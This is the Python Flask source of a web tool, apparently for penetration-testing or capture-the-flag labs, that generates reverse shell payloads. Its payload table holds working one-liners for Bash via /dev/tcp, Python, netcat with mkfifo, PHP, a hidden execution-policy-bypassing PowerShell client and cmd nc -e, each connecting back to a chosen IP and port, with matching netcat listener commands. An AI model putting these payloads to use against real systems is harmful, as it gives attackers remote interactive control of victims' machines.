from flask import Flask, request, abort
import subprocess
import urllib.parse
import ipaddress
import html
import json

app = Flask(__name__)

# Get tun0 IP safely
def get_tun0_ip():
    try:
        result = subprocess.check_output(["ip", "-4", "addr", "show", "tun0"]).decode()
        for line in result.splitlines():
            if "inet " in line:
                return line.strip().split()[1].split("/")[0]
    except Exception:
        return "127.0.0.1"

# Validate IP
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Validate port
def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

@app.route("/")
def home():
    ip = get_tun0_ip()
    return f"""
    <html>
    <head>
        <title>RevShell Generator</title>
        <style>
            body {{
                background-color: #121212;
                color: #ffffff;
                font-family: monospace;
                text-align: center;
                padding-top: 50px;
            }}
            input, select {{
                background-color: #1e1e1e;
                color: #ffffff;
                border: 1px solid #333;
                padding: 8px;
                margin: 5px;
                width: 200px;
            }}
            input[type=submit] {{
                background-color: #333;
                cursor: pointer;
            }}
            input[type=submit]:hover {{
                background-color: #555;
            }}
        </style>
    </head>
    <body>

    <h2>Reverse Shell Generator 💀</h2>

    <form method="GET" action="/generate">
        IP:<br>
        <input name="ip" value="{ip}"><br>

        Port:<br>
        <input name="port" value="4444"><br>

        Shell:<br>
        <select name="type">
            <option value="bash">Bash</option>
            <option value="python">Python</option>
            <option value="nc">Netcat</option>
            <option value="php">PHP</option>
            <option value="powershell">PowerShell (Windows)</option>
#            <option value="cmd">CMD (Windows)</option>
        </select><br><br>

        <input type="submit" value="Generate">
    </form>

    <footer style="margin-top: 20px; color: #666; font-size: 10px;">
    [ stlth_r4k3r ]
    </footer>

    </body>
    </html>
    """

@app.route("/generate")
def generate():
    ip = request.args.get("ip", "")
    port = request.args.get("port", "")
    shell_type = request.args.get("type", "")

    # Validate input
    if not is_valid_ip(ip) or not is_valid_port(port):
        return "<h3>Invalid IP or Port</h3>"

    port = int(port)

    payloads = {
        "bash": f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        "nc": f"mkfifo /tmp/f; nc {ip} {port} < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"".format(ip=ip, port=port),
        "cmd": f"cmd.exe /c nc {ip} {port} -e cmd.exe",
    }

    note = ""
    if shell_type == "cmd":
        note = "Note: only works if nc.exe exists on target"

    payload = payloads.get(shell_type)
    if not payload:
        abort(400)

    # Escape for HTML display
    safe_payload = html.escape(payload)

    encoded_payload = urllib.parse.quote(payload)

    listener = f"nc -lvnp {port}"
    rlwrap_listener = f"rlwrap nc -lvnp {port}"

    return f"""
    <html>
    <head>
        <style>
            body {{
                background-color: #121212;
                color: #ffffff;
                font-family: monospace;
                padding: 40px;
            }}
            pre {{
                background-color: #1e1e1e;
                padding: 15px;
                border: 1px solid #333;
                overflow-x: auto;
            }}
            button {{
                background-color: #333;
                color: white;
                border: none;
                padding: 8px 12px;
                cursor: pointer;
                margin-top: 5px;
            }}
            button:hover {{
                background-color: #555;
            }}
            .center {{
                text-align: center;
            }}


        </style>

        <script>
            function copyToClipboard(text, btn) {{
                navigator.clipboard.writeText(text).then(() => {{
                    const original = btn.innerText;
                    btn.innerText = "Copied!";
                    setTimeout(() => {{
                        btn.innerText = original;
                    }}, 1000);
                }});
            }}
        </script>
    </head>
    <body>

    <h2 class="center">Generated Payload 💀</h2>
    <p class="center" style="color:#888; font-size: 12px;">{note}</p>

    <h3>Listener</h3>
    <pre id="listener">{listener}</pre>
    <button onclick="copyToClipboard(document.getElementById('listener').innerText, this)">Copy</button>

    <h3>RLWrap Listener</h3>
    <pre id="rlwrap">{rlwrap_listener}</pre>
    <button onclick="copyToClipboard(document.getElementById('rlwrap').innerText, this)">Copy</button>

    <h3>Raw Payload</h3>
    <pre id="raw_payload">{safe_payload}</pre>
    <button onclick="copyToClipboard(document.getElementById('raw_payload').innerText, this)">Copy</button>

    <h3>URL Encoded Payload</h3>
    <pre id="encoded">{encoded_payload}</pre>
    <button onclick="copyToClipboard(document.getElementById('encoded').innerText, this)">Copy</button>

    <br><br>
    <a href="/" style="color:white;">⬅ Back</a>

    <footer style="margin-top: 20px; color: #666; font-size: 10px; text-align: center;">
    [ stlth_r4k3r ]
    </footer>

    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
